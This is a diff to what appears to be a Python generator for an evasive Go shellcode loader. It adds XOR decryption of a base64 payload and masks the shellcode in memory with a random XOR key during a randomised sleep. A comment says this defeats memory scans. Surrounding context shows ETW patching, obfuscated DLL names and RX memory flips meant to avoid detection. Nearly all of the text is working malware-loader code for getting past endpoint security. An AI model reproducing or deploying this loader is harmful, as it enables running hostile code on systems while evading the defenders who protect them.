@@ -85,7 +85,7 @@ def generate(output_path="runner.go", injection="create_thread"):
         'procVA', 'procCT', 'procWF', 'procMC',
         'kDLL', 'nDLL', 'patchETW', 'etwProc',
         'fiberMain', 'fiberSC', 'procCTF', 'procCF', 'procSTF',
-        'procEW', 'jitter', 'sleepMs',
+        'procEW', 'jitter', 'sleepMs', 'tempKey', 'scKey',
     ]}
 
     # Obfuscated DLL names via byte slice construction
@@ -204,7 +204,17 @@ func {v['readPayload']}(p string) []byte {{
 func {v['decode']}(data []byte) []byte {{
 \tdecoded, err := base64.StdEncoding.DecodeString(string(data))
 \t{v['checkErr']}(err, "decode failed")
-\treturn decoded
+\tif len(decoded) < 2 {{
+\t\tfmt.Fprintf(os.Stderr, "[!] payload invalid\\n")
+\t\tos.Exit(1)
+\t}}
+\t// First byte is XOR key; remaining bytes are XOR-encrypted shellcode.
+\t{v['scKey']} := decoded[0]
+\tsc := make([]byte, len(decoded)-1)
+\tfor i, b := range decoded[1:] {{
+\t\tsc[i] = b ^ {v['scKey']}
+\t}}
+\treturn sc
 }}
 
 func {v['run']}({v['decodedSC']} []byte) {{
@@ -229,6 +239,17 @@ func {v['run']}({v['decodedSC']} []byte) {{
 \t\tuintptr(unsafe.Pointer(&{v['decodedSC']}[0])),
 \t\tuintptr(len({v['decodedSC']})),
 \t)
+
+\t// XOR-encrypt shellcode in RW memory while sleeping.
+\t// Defeats MARS time-based memory scans — no recognisable bytes at rest.
+\t{v['tempKey']} := byte(rand.Intn(254) + 1)
+\tfor i := 0; i < len({v['decodedSC']}); i++ {{
+\t\t*(*byte)(unsafe.Pointer({v['memAddr']} + uintptr(i))) ^= {v['tempKey']}
+\t}}
+\ttime.Sleep(time.Duration(rand.Intn(3000)+2000) * time.Millisecond)
+\tfor i := 0; i < len({v['decodedSC']}); i++ {{
+\t\t*(*byte)(unsafe.Pointer({v['memAddr']} + uintptr(i))) ^= {v['tempKey']}
+\t}}
 
 \t// Flip to RX (execute, no write) — avoids RWX detection
 \tvar {v['oldProt']} uint32
